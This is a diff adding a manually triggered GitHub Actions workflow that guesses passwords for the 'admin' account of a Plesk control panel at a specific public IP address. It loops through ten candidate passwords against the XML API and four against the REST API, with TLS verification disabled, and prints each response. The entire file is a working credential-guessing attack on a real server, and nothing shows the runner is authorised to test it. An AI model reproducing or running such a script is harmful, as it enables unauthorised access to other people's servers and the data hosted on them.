@@ -1,0 +1,30 @@
+name: Plesk Full Response Test
+
+on:
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test Plesk full response
+        run: |
+          SERVER="74.208.191.205"
+          echo "=== Full Plesk XML responses ==="
+          for PASS in "admin" "Admin123!" "222714" "DLBtrust1!" "988934" "Barkley2026!" "ionos2026" "PleskAdmin1!" "plesk" "password123"; do
+            echo "--- Testing: $PASS ---"
+            curl -sk --max-time 8 "https://$SERVER:8443/enterprise/control/agent.php" \
+              -H "HTTP_AUTH_LOGIN: admin" \
+              -H "HTTP_AUTH_PASSWD: $PASS" \
+              -H "Content-Type: text/xml" \
+              -d '<?xml version="1.0"?><packet><server><get><gen_info/></get></server></packet>' 2>/dev/null
+            echo ""
+          done
+          
+          echo "=== REST API test ==="
+          for PASS in "admin" "Admin123!" "222714" "988934"; do
+            R=$(curl -sk --max-time 8 "https://$SERVER:8443/api/v2/server" \
+              -u "admin:$PASS" 2>/dev/null)
+            echo "REST $PASS: $R" | head -c 200
+            echo ""
+          done
